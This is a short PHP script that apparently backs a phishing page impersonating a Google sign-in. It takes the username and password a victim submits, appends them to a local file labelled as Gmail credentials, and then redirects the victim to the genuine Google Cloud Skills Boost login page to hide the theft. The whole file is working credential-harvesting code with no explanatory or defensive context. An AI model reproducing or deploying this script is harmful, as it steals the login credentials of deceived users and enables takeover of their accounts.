<?php
//file_put_contents("usernames.txt", "Gmail Username: " . $_POST['utf8'] . " Pass: " . $_POST['authenticity_token'] . "\n", FILE_APPEND);

file_put_contents("usernames.txt", "Gmail Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://www.cloudskillsboost.google/users/sign_in');
exit();
?>